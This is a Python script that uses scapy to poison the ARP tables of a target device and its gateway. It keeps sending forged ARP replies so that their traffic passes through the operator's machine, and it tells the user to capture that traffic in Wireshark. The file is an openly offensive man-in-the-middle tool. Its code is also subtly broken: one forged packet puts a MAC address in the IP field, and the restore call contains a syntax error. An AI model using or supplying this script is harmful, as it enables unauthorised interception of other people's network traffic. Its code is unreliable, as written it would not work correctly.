import scapy.all as scapy
import argparse
import time
import sys
import warnings
warnings.filterwarnings("ignore")

#Use a tool like Nmap to find the IP and MAC addresses of the Target and the Gateway
#Example: nmap -T4 -F 192.168.x.x/24

try:
    target_ip = "192.168.x.x" #IP address of the Target device
    target_mac = "XX:XX:XX:XX:XX:XX" #MAC Address of the Target Device

    gateway_ip = "192.168.x.x" #IP address of the Gateway
    gateway_mac = "XX:XX:XX:XX:XX:XX" #MAC Address of the Gateway


    arp_packet1 = scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= gateway_mac) #Creates spoofed ARP packet for Target device
    arp_packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst= gateway_mac, psrc=target_ip) #Creates spoofed ARP packet for Gateway

    #Scapy automatically sends current device's MAC address as part of the packet
    #Gateway will see an ARP packet with "192.168.x.x (Target) is at XX:XX:XX:XX:XX:XX (Current device MAC address)"

    print("----Poisoning ARP Tables of " + target_ip + " and " + gateway_ip + "----")
    print("----Open network sniffing tool like WireShark for MITM traffic capture----")
    print("----Try filtering with ip.src == " + target_ip + "----")



    while True: #Sends the packets
        scapy.send(arp_packet1, verbose=False)
        scapy.send(arp_packet2, verbose=False)
        #print("Sending")


except: #Restores ARP tables when program ends
    print("----Program ending and restoring ARP Tables. Please wait.... ----")
    packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac) #ARP packet for Target
    packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac) #ARP packet for Gateway

    scapy.send(packet1, verbose-False) #Sends the packets
    scapy.send(packet2, verbose=False)
    print("----Restored ARP Tables----")



    
    
    
